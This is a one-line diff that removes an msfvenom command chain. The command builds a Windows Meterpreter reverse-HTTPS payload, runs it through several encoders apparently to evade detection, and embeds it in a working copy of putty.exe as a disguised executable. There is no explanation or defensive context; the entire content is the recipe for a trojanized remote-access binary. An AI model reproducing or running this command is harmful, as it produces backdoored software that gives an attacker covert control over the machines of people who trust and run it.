@@ -1,1 +1,0 @@
-msfvenom -p windows/meterpreter/reverse_https -f raw -e x86/shikata_ga_nai -x /tmp/putty.exe -k |msfvenom -p - -a x86 --platform windows -e x86/jmp_call_additive -f raw | msfvenom -p - -a x86 --platform windows -f raw -e x86/call4_dword_xor | msfvenom -p - -a x86 --platform windows -f exe -o test_putty -e x86/shikata_ga_nai
